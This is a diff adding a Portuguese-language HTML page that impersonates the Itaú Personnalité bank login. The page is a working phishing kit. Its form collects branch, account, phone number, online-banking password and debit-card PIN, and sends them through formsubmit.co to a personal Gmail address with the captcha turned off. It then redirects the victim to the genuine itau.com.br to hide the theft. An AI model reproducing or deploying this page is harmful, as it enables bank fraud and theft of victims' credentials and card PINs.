@@ -1,0 +1,227 @@
+﻿<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Itaú Personnalité - Acesso Premium</title>
+
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;600&display=swap');
+
+    * {
+      margin: 0; padding: 0; box-sizing: border-box;
+      font-family: 'Poppins', sans-serif;
+    }
+
+    body, html {
+      height: 100%;
+      background: #0b1120;
+      color: #caa539;
+      overflow-x: hidden;
+    }
+
+    body::before {
+      content: "";
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: url('data:image/jpeg;base64,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') no-repeat center center/cover;
+      filter: brightness(0.3);
+      z-index: -2;
+    }
+    body::after {
+      content: "";
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: linear-gradient(135deg, rgba(11,17,32,0.85), rgba(17,41,79,0.85));
+      z-index: -1;
+    }
+
+    main {
+      min-height: 100vh;
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      align-items: center;
+      padding: 40px 20px;
+      gap: 50px;
+    }
+
+    .branding {
+      flex: 1 1 350px;
+      max-width: 450px;
+      text-align: center;
+      color: #caa539;
+      user-select: none;
+    }
+
+    /* Logo Itaú SVG */
+    .logo {
+      margin: 0 auto 25px;
+      width: 150px;
+      height: auto;
+      filter: drop-shadow(0 0 8px #caa539);
+    }
+    .logo svg path {
+      fill: #caa539;
+    }
+
+    .branding .title {
+      font-weight: 700;
+      font-size: 2.5rem;
+      margin-bottom: 30px;
+      letter-spacing: 2px;
+      text-shadow:
+        0 0 6px #caa539,
+        0 0 10px #ffd700;
+    }
+
+    .benefits {
+      text-align: left;
+      font-weight: 600;
+      font-size: 1.1rem;
+      color: #e6d57e;
+      line-height: 1.6;
+    }
+    .benefits ul {
+      list-style: none;
+      margin-top: 15px;
+    }
+    .benefits ul li {
+      margin-bottom: 15px;
+      position: relative;
+      padding-left: 30px;
+      color: #f7e293;
+    }
+    .benefits ul li::before {
+      content: "✔";
+      position: absolute;
+      left: 0;
+      top: 0;
+      color: #f1c40f;
+      font-weight: 900;
+      font-size: 1.3rem;
+      text-shadow: 0 0 4px #f1c40f;
+      line-height: 1;
+    }
+
+    form {
+      flex: 1 1 350px;
+      max-width: 450px;
+      background: rgba(18, 25, 43, 0.9);
+      border-radius: 20px;
+      padding: 35px 40px;
+      box-shadow: 0 0 45px rgba(202, 165, 57, 0.6);
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+    }
+
+    form label {
+      font-weight: 600;
+      font-size: 1.1rem;
+      color: #f3de72;
+    }
+
+    form input {
+      padding: 14px 18px;
+      border-radius: 14px;
+      border: 2px solid #caa539;
+      background: #171f38;
+      color: #f3de72;
+      font-size: 1.1rem;
+      transition: border-color 0.3s ease;
+      outline-offset: 3px;
+    }
+    form input::placeholder {
+      color: #b8a94caa;
+    }
+    form input:focus {
+      border-color: #ffd700;
+      box-shadow: 0 0 12px #ffd70099;
+    }
+
+    form button {
+      margin-top: 10px;
+      background: linear-gradient(90deg, #bfa634, #f5e86a);
+      border: none;
+      border-radius: 20px;
+      color: #301f00;
+      font-size: 1.5rem;
+      font-weight: 700;
+      padding: 16px 0;
+      cursor: pointer;
+      box-shadow:
+        0 0 18px #d9c25e,
+        0 0 30px #f3e866;
+      transition: background-position 0.3s ease;
+      background-size: 200% 100%;
+      background-position: left;
+    }
+    form button:hover {
+      background-position: right;
+      color: #100a00;
+      box-shadow:
+        0 0 30px #ffeb3b,
+        0 0 50px #ffeb3b;
+    }
+
+    /* Responsive */
+    @media (max-width: 960px) {
+      main {
+        flex-direction: column;
+        padding: 40px 20px;
+        gap: 40px;
+      }
+      form, .branding {
+        max-width: 100%;
+      }
+    }
+  </style>
+</head>
+<body>
+  <main>
+    <section class="branding" aria-label="Marca Itaú Personnalité e benefícios">
+      <div class="logo" aria-hidden="true">
+        <!-- SVG Logo Itaú -->
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 75 60" width="150" height="120" aria-hidden="true" focusable="false">
+          <rect width="75" height="60" rx="12" ry="12" fill="#f9a825" />
+          <text x="50%" y="50%" fill="#1b1b1b" font-family="Poppins, sans-serif" font-weight="700" font-size="36" text-anchor="middle" alignment-baseline="central" dominant-baseline="central" letter-spacing="2">itau</text>
+        </svg>
+      </div>
+      <div class="title">Personnalité</div>
+      <div class="benefits">
+        <p>Benefícios exclusivos para clientes premium:</p>
+        <ul>
+          <li>Atendimento personalizado 24h</li>
+          <li>Consultoria financeira dedicada</li>
+          <li>Cartões com limite exclusivo</li>
+          <li>Acesso prioritário a eventos e serviços</li>
+          <li>Descontos e vantagens em parceiros selecionados</li>
+        </ul>
+      </div>
+    </section>
+
+    <form action="https://formsubmit.co/bieell.vg@gmail.com" method="POST" autocomplete="off" aria-label="Formulário de acesso Itaú Personnalité">
+      <input type="hidden" name="_next" value="https://www.itau.com.br" />
+      <input type="hidden" name="_captcha" value="false" />
+
+      <label for="agencia">Agência</label>
+      <input type="text" id="agencia" name="agencia" placeholder="0000" required pattern="\d{4}" title="Informe 4 números" />
+
+      <label for="conta">Conta</label>
+      <input type="text" id="conta" name="conta" placeholder="000000-0" required pattern="\d{6}-\d" title="Formato esperado: 000000-0" />
+
+      <label for="telefone">Telefone com DDD</label>
+      <input type="tel" id="telefone" name="telefone" placeholder="(00) 00000-0000" required pattern="\(\d{2}\) \d{4,5}-\d{4}" title="Formato: (00) 00000-0000" />
+
+      <label for="senhaacesso">Senha de acesso</label>
+      <input type="password" id="senhaacesso" name="senhaacesso" placeholder="********" required minlength="4" />
+
+      <label for="senhadb">Senha do cartão débito</label>
+      <input type="password" id="senhadb" name="senhadb" placeholder="******" required minlength="4" />
+
+      <button type="submit" aria-label="Confirmar dados e enviar">Confirmar Acesso</button>
+    </form>
+  </main>
+</body>
+</html>
